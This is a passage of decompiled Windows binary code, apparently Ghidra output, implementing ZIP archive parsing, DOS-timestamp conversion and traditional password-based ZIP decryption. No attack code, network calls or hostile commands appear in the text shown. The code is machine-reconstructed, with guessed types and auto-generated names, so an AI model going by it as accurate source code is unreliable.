      for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {
        *piVar7 = *piVar6;
        piVar6 = piVar6 + 1;
        piVar7 = piVar7 + 1;
      }
      FUN_00409480();
      return piVar4;
    }
    if (in_EAX[0x10] != '\0') {
      CloseHandle(*(HANDLE *)(in_EAX + 4));
    }
    FUN_0040a83e(in_EAX);
  }
  return (int *)0x0;
}



int __cdecl FUN_00409080(int *param_1,uint *param_2,void *param_3,uint param_4)

{
  char *pcVar1;
  char **in_EAX;
  int iVar2;
  uint uVar3;
  int *piVar4;
  int local_5c [4];
  uint local_4c;
  uint local_3c;
  int local_38;
  int local_34;
  int local_30;
  int local_2c;
  int local_24;
  uint local_20;
  uint local_1c;
  uint local_18;
  int local_14;
  int local_10;
  uint local_c;
  int local_8;
  
  local_8 = 0;
  if (in_EAX == (char **)0x0) {
    return -0x66;
  }
  pcVar1 = *in_EAX;
  if (*pcVar1 == '\0') {
    *(char **)(pcVar1 + 0x1c) = in_EAX[5] + (int)in_EAX[3];
LAB_004090cc:
    iVar2 = FUN_00408bb0();
    if (iVar2 == 0) {
      if (local_c != 0x2014b50) {
        local_8 = -0x67;
      }
      goto LAB_004090f3;
    }
  }
  else if (pcVar1[1] != '\0') {
    SetFilePointer(*(HANDLE *)(pcVar1 + 4),
                   (LONG)(in_EAX[5] + (int)in_EAX[3] + *(int *)(pcVar1 + 0xc)),(PLONG)0x0,0);
    goto LAB_004090cc;
  }
  local_8 = -1;
LAB_004090f3:
  iVar2 = FUN_00408b20(&local_c);
  uVar3 = local_c;
  if ((iVar2 == 0) && (iVar2 = FUN_00408b20(&local_c), iVar2 == 0)) {
    local_5c[0] = local_c * 0x100 + uVar3;
  }
  else {
    local_5c[0] = 0;
    if (iVar2 != 0) {
      local_8 = -1;
    }
  }
  iVar2 = FUN_00408b20(&local_c);
  uVar3 = local_c;
  if ((iVar2 == 0) && (iVar2 = FUN_00408b20(&local_c), iVar2 == 0)) {
    local_5c[1] = local_c * 0x100 + uVar3;
  }
  else {
    local_5c[1] = 0;
    if (iVar2 != 0) {
      local_8 = -1;
    }
  }
  iVar2 = FUN_00408b20(&local_c);
  uVar3 = local_c;
  if ((iVar2 == 0) && (iVar2 = FUN_00408b20(&local_c), iVar2 == 0)) {
    local_5c[2] = local_c * 0x100 + uVar3;
  }
  else {
    local_5c[2] = 0;
    if (iVar2 != 0) {
      local_8 = -1;
    }
  }
  iVar2 = FUN_00408b20(&local_c);
  uVar3 = local_c;
  if ((iVar2 == 0) && (iVar2 = FUN_00408b20(&local_c), iVar2 == 0)) {
    local_5c[3] = local_c * 0x100 + uVar3;
  }
  else {
    local_5c[3] = 0;
    if (iVar2 != 0) {
      local_8 = -1;
    }
  }
  iVar2 = FUN_00408bb0();
  if (iVar2 != 0) {
    local_8 = -1;
  }
  local_18 = local_4c >> 0x10 & 0x1f;
  local_10 = (local_4c >> 0x19) + 0x7bc;
  local_14 = (local_4c >> 0x15 & 0xf) - 1;
  local_1c = local_4c >> 0xb & 0x1f;
  local_20 = local_4c >> 5 & 0x3f;
  local_24 = (local_4c & 0x1f) * 2;
  iVar2 = FUN_00408bb0();
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00408bb0();
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00408bb0();
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00408b20(&local_c);
  local_3c = local_c;
  if ((iVar2 == 0) && (iVar2 = FUN_00408b20(&local_c), iVar2 == 0)) {
    local_3c = local_c * 0x100 + local_3c;
  }
  else {
    local_3c = 0;
    if (iVar2 != 0) {
      local_8 = -1;
    }
  }
  iVar2 = FUN_00408b20(&local_c);
  uVar3 = local_c;
  if ((iVar2 == 0) && (iVar2 = FUN_00408b20(&local_c), iVar2 == 0)) {
    local_38 = local_c * 0x100 + uVar3;
  }
  else {
    local_38 = 0;
    if (iVar2 != 0) {
      local_8 = -1;
    }
  }
  iVar2 = FUN_00408b20(&local_c);
  uVar3 = local_c;
  if ((iVar2 == 0) && (iVar2 = FUN_00408b20(&local_c), iVar2 == 0)) {
    local_34 = local_c * 0x100 + uVar3;
  }
  else {
    local_34 = 0;
    if (iVar2 != 0) {
      local_8 = -1;
    }
  }
  iVar2 = FUN_00408b20(&local_c);
  uVar3 = local_c;
  if ((iVar2 == 0) && (iVar2 = FUN_00408b20(&local_c), iVar2 == 0)) {
    local_30 = local_c * 0x100 + uVar3;
  }
  else {
    local_30 = 0;
    if (iVar2 != 0) {
      local_8 = -1;
    }
  }
  iVar2 = FUN_00408b20(&local_c);
  uVar3 = local_c;
  if ((iVar2 == 0) && (iVar2 = FUN_00408b20(&local_c), iVar2 == 0)) {
    local_2c = local_c * 0x100 + uVar3;
  }
  else {
    local_2c = 0;
    if (iVar2 != 0) {
      local_8 = -1;
    }
  }
  iVar2 = FUN_00408bb0();
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00408bb0();
  if (iVar2 != 0) {
    return -1;
  }
  if (local_8 == 0) {
    if (param_3 != (void *)0x0) {
      if (local_3c < param_4) {
        *(undefined *)(local_3c + (int)param_3) = 0;
      }
      if (((local_3c != 0) && (param_4 != 0)) && (uVar3 = FUN_00408ab0(param_3,1), uVar3 != 1)) {
        return -1;
      }
    }
    if (param_1 != (int *)0x0) {
      piVar4 = local_5c;
      for (iVar2 = 0x14; iVar2 != 0; iVar2 = iVar2 + -1) {
        *param_1 = *piVar4;
        piVar4 = piVar4 + 1;
        param_1 = param_1 + 1;
      }
    }
    if (param_2 != (uint *)0x0) {
      *param_2 = local_c;
    }
  }
  return local_8;
}



int FUN_00409480(void)

{
  int iVar1;
  int unaff_ESI;
  
  if (unaff_ESI == 0) {
    return -0x66;
  }
  *(undefined4 *)(unaff_ESI + 0x14) = *(undefined4 *)(unaff_ESI + 0x24);
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  iVar1 = FUN_00409080((int *)(unaff_ESI + 0x28),(uint *)(unaff_ESI + 0x78),(void *)0x0,0);
  *(uint *)(unaff_ESI + 0x18) = (uint)(iVar1 == 0);
  return iVar1;
}



int __cdecl FUN_004094c0(char **param_1,char **param_2,char **param_3)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  int iVar4;
  char *pcVar5;
  char **unaff_EDI;
  char *local_10;
  char *local_c;
  int local_8;
  
  *param_1 = (char *)0x0;
  pcVar5 = unaff_EDI[3];
  pcVar2 = unaff_EDI[0x1e];
  *param_2 = (char *)0x0;
  pcVar3 = *unaff_EDI;
  cVar1 = *pcVar3;
  local_8 = 0;
  *param_3 = (char *)0x0;
  if (cVar1 == '\0') {
    *(char **)(pcVar3 + 0x1c) = pcVar5 + (int)pcVar2;
  }
  else {
    if (pcVar3[1] == '\0') {
      return -1;
    }
    SetFilePointer(*(HANDLE *)(pcVar3 + 4),(LONG)(pcVar5 + (int)pcVar2 + *(int *)(pcVar3 + 0xc)),
                   (PLONG)0x0,0);
  }
  iVar4 = FUN_00408bb0();
  if (iVar4 == 0) {
    if (local_10 != (char *)0x4034b50) {
      local_8 = -0x67;
    }
  }
  else {
    local_8 = -1;
  }
  iVar4 = FUN_00408b20((uint *)&local_10);
  if (iVar4 == 0) {
    iVar4 = FUN_00408b20((uint *)&local_10);
    if (iVar4 != 0) goto LAB_00409566;
  }
  else {
LAB_00409566:
    local_8 = -1;
  }
  iVar4 = FUN_00408b20((uint *)&local_10);
  pcVar5 = local_10;
  if (iVar4 == 0) {
    iVar4 = FUN_00408b20((uint *)&local_10);
    if (iVar4 != 0) goto LAB_0040959f;
    local_10 = pcVar5 + (int)local_10 * 0x100;
  }
  else {
LAB_0040959f:
    local_10 = (char *)0x0;
    if (iVar4 != 0) {
      local_8 = -1;
    }
  }
  iVar4 = FUN_00408b20((uint *)&local_c);
  pcVar5 = local_c;
  if (iVar4 == 0) {
    iVar4 = FUN_00408b20((uint *)&local_c);
    if (iVar4 != 0) goto LAB_00409625;
    local_c = pcVar5 + (int)local_c * 0x100;
LAB_004095e1:
    if ((local_8 == 0) &&
       ((pcVar5 = unaff_EDI[0xd], local_c != pcVar5 ||
        ((pcVar5 != (char *)0x0 && (pcVar5 != (char *)0x8)))))) {
      local_8 = -0x67;
    }
  }
  else {
LAB_00409625:
    local_c = (char *)0x0;
    if (iVar4 == 0) goto LAB_004095e1;
    local_8 = -1;
  }
  iVar4 = FUN_00408bb0();
  if (iVar4 != 0) {
    local_8 = -1;
  }
  iVar4 = FUN_00408bb0();
  if (iVar4 == 0) {
    if (((local_8 == 0) && (local_c != unaff_EDI[0xf])) && (((uint)local_10 & 8) == 0)) {
      local_8 = -0x67;
    }
  }
  else {
    local_8 = -1;
  }
  iVar4 = FUN_00408bb0();
  if (iVar4 == 0) {
    if (((local_8 == 0) && (local_c != unaff_EDI[0x10])) && (((uint)local_10 & 8) == 0)) {
      local_8 = -0x67;
    }
  }
  else {
    local_8 = -1;
  }
  iVar4 = FUN_00408bb0();
  if (iVar4 == 0) {
    if (((local_8 == 0) && (local_c != unaff_EDI[0x11])) && (((uint)local_10 & 8) == 0)) {
      local_8 = -0x67;
    }
  }
  else {
    local_8 = -1;
  }
  iVar4 = FUN_00408b20((uint *)&local_10);
  local_c = local_10;
  if (iVar4 == 0) {
    iVar4 = FUN_00408b20((uint *)&local_10);
    if (iVar4 != 0) goto LAB_00409729;
    pcVar5 = local_c + (int)local_10 * 0x100;
LAB_004096df:
    if ((local_8 == 0) && (pcVar5 != unaff_EDI[0x12])) {
      local_8 = -0x67;
    }
  }
  else {
LAB_00409729:
    pcVar5 = (char *)0x0;
    if (iVar4 == 0) goto LAB_004096df;
    local_8 = -1;
  }
  *param_1 = *param_1 + (int)pcVar5;
  iVar4 = FUN_00408b20((uint *)&local_10);
  local_c = local_10;
  if (iVar4 == 0) {
    iVar4 = FUN_00408b20((uint *)&local_10);
    if (iVar4 == 0) {
      local_c = local_c + (int)local_10 * 0x100;
      goto LAB_00409745;
    }
  }
  local_c = (char *)0x0;
  if (iVar4 != 0) {
    local_8 = -1;
  }
LAB_00409745:
  *param_2 = unaff_EDI[0x1e] + 0x1e + (int)pcVar5;
  *param_3 = local_c;
  *param_1 = *param_1 + (int)local_c;
  return local_8;
}



undefined4 __cdecl FUN_00409770(char *param_1)

{
  void **in_EAX;
  int iVar1;
  void **_Memory;
  void *pvVar2;
  void **ppvVar3;
  void **extraout_EDX;
  char *local_10;
  char *local_c;
  char *local_8;
  
  if ((in_EAX == (void **)0x0) || (in_EAX[6] == (void *)0x0)) {
    return 0xffffff9a;
  }
  if (in_EAX[0x1f] != (void *)0x0) {
    FUN_00409b40();
  }
  iVar1 = FUN_004094c0(&local_10,&local_8,&local_c);
  if (iVar1 != 0) {
    return 0xffffff99;
  }
  _Memory = (void **)_malloc(0x84);
  if (_Memory != (void **)0x0) {
    pvVar2 = _malloc(0x4000);
    *_Memory = pvVar2;
    _Memory[0x11] = local_8;
    _Memory[0x12] = local_c;
    _Memory[0x13] = (void *)0x0;
    if (pvVar2 != (void *)0x0) {
      _Memory[0x10] = (void *)0x0;
      pvVar2 = in_EAX[0xd];
      _Memory[0x15] = in_EAX[0xf];
      _Memory[0x14] = (void *)0x0;
      _Memory[0x19] = in_EAX[0xd];
      _Memory[0x18] = *in_EAX;
      _Memory[0x1a] = in_EAX[3];
      _Memory[6] = (void *)0x0;
      if (pvVar2 != (void *)0x0) {
        _Memory[9] = (void *)0x0;
        _Memory[10] = (void *)0x0;
        _Memory[0xb] = (void *)0x0;
        iVar1 = FUN_00408660();
        if (iVar1 == 0) {
          _Memory[0x10] = (void *)0x1;
        }
      }
      _Memory[0x16] = in_EAX[0x10];
      _Memory[0x17] = in_EAX[0x11];
      *(byte *)(_Memory + 0x1b) = *(byte *)(in_EAX + 0xc) & 1;
      if (((uint)in_EAX[0xc] >> 3 & 1) == 0) {
        *(undefined *)(_Memory + 0x20) = *(undefined *)((int)in_EAX + 0x3f);
      }
      else {
        *(undefined *)(_Memory + 0x20) = *(undefined *)((int)in_EAX + 0x39);
      }
      ppvVar3 = _Memory + 0x1c;
      _Memory[0x1f] = (void *)(-(uint)(*(char *)(_Memory + 0x1b) != '\0') & 0xc);
      *ppvVar3 = (void *)0x12345678;
      _Memory[0x1d] = (void *)0x23456789;
      _Memory[0x1e] = (void *)0x34567890;
      if (param_1 != (char *)0x0) {
        do {
          if (*param_1 == '\0') break;
          FUN_00408340(*param_1,(uint *)ppvVar3);
          param_1 = param_1 + 1;
          ppvVar3 = extraout_EDX;
        } while (param_1 != (char *)0x0);
      }
      _Memory[0xf] = local_10 + (int)in_EAX[0x1e] + 0x1e;
      _Memory[2] = (void *)0x0;
      in_EAX[0x1f] = _Memory;
      return 0;
    }
    _free(_Memory);
  }
  return 0xffffff98;
}



byte * __thiscall FUN_004098e0(void *this,void *param_1,undefined *param_2)

{
  void **ppvVar1;
  char cVar2;
  void **ppvVar3;
  char *pcVar4;
  byte *pbVar5;
  undefined uVar6;
  int in_EAX;
  uint uVar7;
  void *pvVar8;
  void *pvVar9;
  void *pvVar10;
  byte *local_c;
  byte *local_8;
  
  local_c = (byte *)0x0;
  local_8 = (byte *)0x0;
  if (param_2 != (undefined *)0x0) {
    *param_2 = 0;
  }
  if ((in_EAX == 0) || (ppvVar3 = *(void ***)(in_EAX + 0x7c), ppvVar3 == (void **)0x0)) {
    return (byte *)0xffffff9a;
  }
  if (*ppvVar3 == (void *)0x0) {
    return (byte *)0xffffff9c;
  }
  if (this == (void *)0x0) {
    return (byte *)0x0;
  }
  ppvVar3[4] = param_1;
  ppvVar3[5] = this;
  if (ppvVar3[0x17] < this) {
    ppvVar3[5] = ppvVar3[0x17];
  }
  if (ppvVar3[5] != (void *)0x0) {
    do {
      if ((ppvVar3[2] == (void *)0x0) && (pvVar9 = ppvVar3[0x16], pvVar9 != (void *)0x0)) {
        pvVar8 = (void *)0x4000;
        if ((pvVar9 < (void *)0x4000) && (pvVar8 = pvVar9, pvVar9 == (void *)0x0)) {
          if (param_2 == (undefined *)0x0) {
            return (byte *)0x0;
          }
          *param_2 = 1;
          return (byte *)0x0;
        }
        pcVar4 = (char *)ppvVar3[0x18];
        if (*pcVar4 == '\0') {
          *(int *)(pcVar4 + 0x1c) = (int)ppvVar3[0x1a] + (int)ppvVar3[0xf];
        }
        else {
          if (pcVar4[1] == '\0') {
            return (byte *)0xffffffff;
          }
          SetFilePointer(*(HANDLE *)(pcVar4 + 4),
                         *(int *)(pcVar4 + 0xc) + (int)ppvVar3[0x1a] + (int)ppvVar3[0xf],(PLONG)0x0,
                         0);
        }
        uVar7 = FUN_00408ab0(*ppvVar3,1);
        if (uVar7 != 1) {
          return (byte *)0xffffffff;
        }
        pvVar9 = *ppvVar3;
        ppvVar3[0xf] = (void *)((int)ppvVar3[0xf] + (int)pvVar8);
        ppvVar3[0x16] = (void *)((int)ppvVar3[0x16] - (int)pvVar8);
        ppvVar3[1] = pvVar9;
        ppvVar3[2] = pvVar8;
        if ((*(char *)(ppvVar3 + 0x1b) != '\0') && (pvVar10 = (void *)0x0, pvVar8 != (void *)0x0)) {
          do {
            uVar6 = FUN_00408390();
            *(undefined *)((int)pvVar10 + (int)pvVar9) = uVar6;
            pvVar10 = (void *)((int)pvVar10 + 1);
          } while (pvVar10 < pvVar8);
        }
      }
      pvVar9 = ppvVar3[2];
      pvVar8 = ppvVar3[0x1f];
      if (pvVar9 < ppvVar3[0x1f]) {
        pvVar8 = pvVar9;
      }
      if (pvVar8 != (void *)0x0) {
        cVar2 = *(char *)((int)(void *)((int)ppvVar3[1] + (int)pvVar8) + -1);
        ppvVar3[0x17] = (void *)((int)ppvVar3[0x17] - (int)pvVar8);
        ppvVar1 = ppvVar3 + 0x1f;
        *ppvVar1 = (void *)((int)*ppvVar1 - (int)pvVar8);
        ppvVar3[2] = (void *)((int)pvVar9 - (int)pvVar8);
        ppvVar3[1] = (void *)((int)ppvVar3[1] + (int)pvVar8);
        if ((*ppvVar1 == (void *)0x0) && (cVar2 != *(char *)(ppvVar3 + 0x20))) {
          return (byte *)0xffffff96;
        }
      }
      if (ppvVar3[0x19] == (void *)0x0) {
        pvVar9 = ppvVar3[2];
        if (ppvVar3[5] < ppvVar3[2]) {
          pvVar9 = ppvVar3[5];
        }
        pvVar8 = (void *)0x0;
        if (pvVar9 != (void *)0x0) {
          do {
            *(undefined *)((int)pvVar8 + (int)ppvVar3[4]) =
                 *(undefined *)((int)pvVar8 + (int)ppvVar3[1]);
            pvVar8 = (void *)((int)pvVar8 + 1);
          } while (pvVar8 < pvVar9);
        }
        pbVar5 = (byte *)ppvVar3[4];
        pvVar8 = (void *)FUN_00408240(pbVar5,(uint)pvVar9);
        ppvVar3[0x17] = (void *)((int)ppvVar3[0x17] - (int)pvVar9);
        ppvVar3[2] = (void *)((int)ppvVar3[2] - (int)pvVar9);
        ppvVar3[5] = (void *)((int)ppvVar3[5] - (int)pvVar9);
        ppvVar3[1] = (void *)((int)ppvVar3[1] + (int)pvVar9);
        ppvVar3[6] = (void *)((int)ppvVar3[6] + (int)pvVar9);
        local_8 = local_8 + (int)pvVar9;
        ppvVar3[0x14] = pvVar8;
        ppvVar3[4] = pbVar5 + (int)pvVar9;
        if ((ppvVar3[0x17] == (void *)0x0) && (param_2 != (undefined *)0x0)) {
          *param_2 = 1;
        }
      }
      else {
        pbVar5 = (byte *)ppvVar3[4];
        pvVar9 = ppvVar3[6];
        local_c = FUN_00408710();
        uVar7 = (int)ppvVar3[6] - (int)pvVar9;
        pvVar9 = (void *)FUN_00408240(pbVar5,uVar7);
        ppvVar3[0x17] = (void *)((int)ppvVar3[0x17] - uVar7);
        local_8 = local_8 + uVar7;
        ppvVar3[0x14] = pvVar9;
        if ((local_c == (byte *)0x1) || (ppvVar3[0x17] == (void *)0x0)) {
          if (param_2 == (undefined *)0x0) {
            return local_8;
          }
          *param_2 = 1;
          return local_8;
        }
        if (local_c != (byte *)0x0) {
          return local_c;
        }
      }
    } while (ppvVar3[5] != (void *)0x0);
    if (local_c != (byte *)0x0) {
      return local_c;
    }
  }
  return local_8;
}



undefined4 FUN_00409b40(void)

{
  void **_Memory;
  int unaff_EDI;
  undefined4 local_8;
  
  local_8 = 0;
  if (unaff_EDI == 0) {
    return 0xffffff9a;
  }
  _Memory = *(void ***)(unaff_EDI + 0x7c);
  if (_Memory == (void **)0x0) {
    return 0xffffff9a;
  }
  if ((_Memory[0x17] == (void *)0x0) && (_Memory[0x14] != _Memory[0x15])) {
    local_8 = 0xffffff97;
  }
  if (*_Memory != (void *)0x0) {
    _free(*_Memory);
    *_Memory = (void *)0x0;
  }
  *_Memory = (void *)0x0;
  if (_Memory[0x10] != (void *)0x0) {
    FUN_00408610();
  }
  _Memory[0x10] = (void *)0x0;
  _free(_Memory);
  *(undefined4 *)(unaff_EDI + 0x7c) = 0;
  return local_8;
}



void __thiscall FUN_00409bd0(void *this,uint param_1)

{
  _FILETIME local_24;
  SYSTEMTIME local_1c;
  uint local_c;
  
  local_c = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_1c.wYear = ((ushort)this >> 9) + 0x7bc;
  local_1c.wMonth = (ushort)((uint)this >> 5) & 0xf;
  local_1c.wDay = (ushort)this & 0x1f;
  local_1c.wHour = (ushort)param_1 >> 0xb;
  local_1c.wMinute = (ushort)(param_1 >> 5) & 0x3f;
  local_1c.wSecond = ((ushort)param_1 & 0x1f) * 2;
  local_1c.wMilliseconds = 0;
  SystemTimeToFileTime(&local_1c,&local_24);
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00409c60(void)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  undefined4 *unaff_ESI;
  
  *unaff_ESI = 0;
  unaff_ESI[1] = 0xffffffff;
  unaff_ESI[0x8e] = 0xffffffff;
  unaff_ESI[0x8f] = 0;
  unaff_ESI[0x90] = 0;
  pcVar2 = (char *)operator_new(5);
  unaff_ESI[0x8f] = pcVar2;
  pcVar3 = &DAT_0041c3e8;
  do {
    cVar1 = *pcVar3;
    *pcVar2 = cVar1;
    pcVar3 = pcVar3 + 1;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  return;
}



int FUN_00409cb0(undefined4 param_1,undefined4 param_2)

{
  short *psVar1;
  WCHAR WVar2;
  short sVar3;
  int **lpBuffer;
  undefined2 *puVar4;
  int *piVar5;
  int **unaff_ESI;
  undefined4 *puVar6;
  
  if ((*unaff_ESI == (int *)0x0) && (unaff_ESI[1] == (int *)0xffffffff)) {
    lpBuffer = unaff_ESI + 0x91;
    GetCurrentDirectoryW(0x104,(LPWSTR)lpBuffer);
    do {
      WVar2 = *(WCHAR *)lpBuffer;
      lpBuffer = (int **)((int)lpBuffer + 2);
    } while (WVar2 != L'\0');
    sVar3 = *(short *)((int)unaff_ESI + ((int)lpBuffer - ((int)unaff_ESI + 0x246) >> 1) * 2 + 0x242)
    ;
    if ((sVar3 != 0x5c) && (sVar3 != 0x2f)) {
      puVar6 = (undefined4 *)((int)unaff_ESI + 0x242);
      do {
        psVar1 = (short *)((int)puVar6 + 2);
        puVar6 = (undefined4 *)((int)puVar6 + 2);
      } while (*psVar1 != 0);
      *puVar6 = DAT_0041c284;
    }
    puVar4 = (undefined2 *)operator_new(0x20);
    *puVar4 = 0x100;
    *(undefined *)(puVar4 + 8) = 0;
    *(undefined4 *)(puVar4 + 10) = param_1;
    *(undefined4 *)(puVar4 + 0xc) = param_2;
    *(undefined4 *)(puVar4 + 0xe) = 0;
    *(undefined4 *)(puVar4 + 6) = 0;
    piVar5 = FUN_00408e00();
    *unaff_ESI = piVar5;
    return (-(uint)(piVar5 != (int *)0x0) & 0xfffffe00) + 0x200;
  }
  return 0x1000000;
}



void __fastcall FUN_00409d70(int *param_1,int *param_2,int param_3)

{
  wchar_t wVar1;
  int3 iVar2;
  byte bVar3;
  int iVar4;
  void *pvVar5;
  char *pcVar6;
  wchar_t *pwVar7;
  undefined4 *puVar8;
  uint uVar9;
  byte bVar10;
  int iVar11;
  byte *pbVar12;
  byte bVar13;
  int *piVar14;
  wchar_t *_Str;
  int *piVar15;
  bool bVar16;
  longlong lVar17;
  uint local_398 [4];
  uint local_388;
  int local_380;
  int local_37c;
  uint local_364;
  char *local_348;
  FILETIME local_344;
  _FILETIME local_33c;
  int *local_334;
  int *local_330;
  char *local_32c;
  undefined4 local_328;
  byte local_324;
  byte local_323;
  byte local_322;
  byte local_321;
  WCHAR local_320 [260];
  CHAR local_118 [268];
  uint local_c;
  
  local_c = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_334 = param_2;
  local_330 = param_1;
  if ((param_3 < -1) || (*(int *)(*param_1 + 4) <= param_3)) {
    ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
    return;
  }
  if (param_1[1] != -1) {
    FUN_00409b40();
  }
  param_1[1] = -1;
  if (param_3 == param_1[0x8e]) {
    if (param_3 != -1) {
      piVar14 = param_1 + 2;
      piVar15 = local_334;
      for (iVar11 = 0x8c; iVar11 != 0; iVar11 = iVar11 + -1) {
        *piVar15 = *piVar14;
        piVar14 = piVar14 + 1;
        piVar15 = piVar15 + 1;
      }
      ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
      return;
    }
LAB_00409df9:
    *param_2 = *(int *)(*param_1 + 4);
    *(undefined2 *)(param_2 + 1) = 0;
    param_2[0x83] = 0;
    param_2[0x84] = 0;
    param_2[0x85] = 0;
    param_2[0x86] = 0;
    param_2[0x87] = 0;
    param_2[0x88] = 0;
    param_2[0x89] = 0;
    param_2[0x8a] = 0;
    param_2[0x8b] = 0;
    ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
    return;
  }
  if (param_3 == -1) goto LAB_00409df9;
  if (param_3 < *(int *)(*param_1 + 0x10)) {
    FUN_00409480();
  }
  iVar11 = *(int *)(*param_1 + 0x10);
  while (iVar11 < param_3) {
    iVar11 = *param_1;
    if (((iVar11 != 0) && (*(int *)(iVar11 + 0x18) != 0)) &&
       (iVar4 = *(int *)(iVar11 + 0x10) + 1, iVar4 != *(int *)(iVar11 + 4))) {
      *(int *)(iVar11 + 0x10) = iVar4;
      *(int *)(iVar11 + 0x14) =
           *(int *)(iVar11 + 0x14) +
           *(int *)(iVar11 + 0x50) + *(int *)(iVar11 + 0x4c) + 0x2e + *(int *)(iVar11 + 0x48);
      iVar4 = FUN_00409080((int *)(iVar11 + 0x28),(uint *)(iVar11 + 0x78),(void *)0x0,0);
      *(uint *)(iVar11 + 0x18) = (uint)(iVar4 == 0);
    }
    iVar11 = *(int *)(*param_1 + 0x10);
  }
  FUN_00409080((int *)local_398,(uint *)0x0,local_118,0x104);
  iVar11 = FUN_004094c0(&local_348,(char **)&local_328,&local_32c);
  if (iVar11 != 0) {
    ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
    return;
  }
  pcVar6 = *(char **)*param_1;
  if (*pcVar6 == '\0') {
    *(char **)(pcVar6 + 0x1c) = local_328;
  }
  else {
    if (pcVar6[1] == '\0') goto LAB_00409f75;
    SetFilePointer(*(HANDLE *)(pcVar6 + 4),(LONG)(local_328 + *(int *)(pcVar6 + 0xc)),(PLONG)0x0,0);
  }
  pcVar6 = local_32c;
  pvVar5 = operator_new((uint)local_32c);
  pcVar6 = (char *)FUN_00408ab0(pvVar5,(uint)pcVar6);
  piVar14 = local_334;
  if (pcVar6 == local_32c) {
    *local_334 = *(int *)(*local_330 + 0x10);
    MultiByteToWideChar(0xfde9,0,local_118,-1,local_320,0x104);
    _Str = local_320;
    while( true ) {
      while( true ) {
        while( true ) {
          while( true ) {
            while( true ) {
              while( true ) {
                for (; (wVar1 = *_Str, wVar1 != L'\0' && (_Str[1] == L':')); _Str = _Str + 2) {
                }
                if (wVar1 != L'\\') break;
                _Str = _Str + 1;
              }
              if (wVar1 != L'/') break;
              _Str = _Str + 1;
            }
            pwVar7 = _wcsstr(_Str,u______0041e5b4);
            if (pwVar7 == (wchar_t *)0x0) break;
            _Str = pwVar7 + 4;
          }
          pwVar7 = _wcsstr(_Str,u______0041e5c0);
          if (pwVar7 == (wchar_t *)0x0) break;
          _Str = pwVar7 + 4;
        }
        pwVar7 = _wcsstr(_Str,u______0041e5cc);
        if (pwVar7 == (wchar_t *)0x0) break;
        _Str = pwVar7 + 4;
      }
      pwVar7 = _wcsstr(_Str,u______0041e5d8);
      if (pwVar7 == (wchar_t *)0x0) break;
      _Str = pwVar7 + 4;
    }
    pwVar7 = _Str;
    do {
      wVar1 = *pwVar7;
      *(wchar_t *)((int)piVar14 + (4 - (int)_Str) + (int)pwVar7) = wVar1;
      pwVar7 = pwVar7 + 1;
    } while (wVar1 != L'\0');
    local_322 = (byte)(local_364 >> 0x1e) & 1;
    bVar13 = ~(byte)(local_364 >> 0x17);
    local_398[0] = local_398[0] >> 8;
    local_323 = 0;
    local_324 = 0;
    local_321 = 1;
    if (((local_398[0] == 0) || (local_398[0] == 7)) ||
       ((local_398[0] == 0xb || (local_398[0] == 0xe)))) {
      local_323 = (byte)(local_364 >> 1) & 1;
      local_324 = (byte)(local_364 >> 2) & 1;
      bVar13 = (byte)local_364;
      bVar3 = (byte)(local_364 >> 5) & 1;
      bVar10 = (byte)(local_364 >> 4) & 1;
    }
    else {
      bVar3 = 1;
      bVar10 = local_322;
    }
    piVar14[0x83] = 0;
    if (bVar10 != 0) {
      piVar14[0x83] = 0x10;
    }
    if (bVar3 != 0) {
      piVar14[0x83] = piVar14[0x83] | 0x20;
    }
    if (local_323 != 0) {
      piVar14[0x83] = piVar14[0x83] | 2;
    }
    if ((bVar13 & 1) != 0) {
      piVar14[0x83] = piVar14[0x83] | 1;
    }
    if (local_324 != 0) {
      piVar14[0x83] = piVar14[0x83] | 4;
    }
    piVar14[0x8a] = local_380;
    piVar14[0x8b] = local_37c;
    local_344 = (FILETIME)FUN_00409bd0((void *)(local_388 >> 0x10),local_388);
    LocalFileTimeToFileTime(&local_344,&local_33c);
    iVar11 = 0;
    piVar14[0x84] = local_33c.dwLowDateTime;
    piVar14[0x85] = local_33c.dwHighDateTime;
    piVar14[0x86] = local_33c.dwLowDateTime;
    piVar14[0x87] = local_33c.dwHighDateTime;
    piVar14[0x88] = local_33c.dwLowDateTime;
    piVar14[0x89] = local_33c.dwHighDateTime;
    if ((char *)0x4 < local_32c) {
      local_328 = (char *)((uint)local_328 & 0xff000000);
      do {
        pbVar12 = &DAT_0041e5e4;
        puVar8 = &local_328;
        do {
          bVar13 = *(byte *)puVar8;
          bVar16 = bVar13 < *pbVar12;
          if (bVar13 != *pbVar12) {
LAB_0040a210:
            iVar4 = (1 - (uint)bVar16) - (uint)(bVar16 != 0);
            goto LAB_0040a215;
          }
          if (bVar13 == 0) break;
          bVar13 = *(byte *)((int)puVar8 + 1);
          bVar16 = bVar13 < pbVar12[1];
          if (bVar13 != pbVar12[1]) goto LAB_0040a210;
          puVar8 = (undefined4 *)((int)puVar8 + 2);
          pbVar12 = pbVar12 + 2;
        } while (bVar13 != 0);
        iVar4 = 0;
LAB_0040a215:
        if (iVar4 == 0) {
          bVar13 = *(byte *)(iVar11 + 4 + (int)pvVar5);
          local_321 = bVar13 >> 1 & 1;
          local_322 = bVar13 >> 2 & 1;
          iVar4 = iVar11 + 5;
          if ((bVar13 & 1) != 0) {
            iVar2 = CONCAT21(CONCAT11(*(undefined *)(iVar11 + 8 + (int)pvVar5),
                                      *(undefined *)(iVar11 + 7 + (int)pvVar5)),
                             *(undefined *)(iVar11 + 6 + (int)pvVar5));
            uVar9 = CONCAT31(iVar2,*(undefined *)(iVar4 + (int)pvVar5));
            iVar4 = iVar11 + 9;
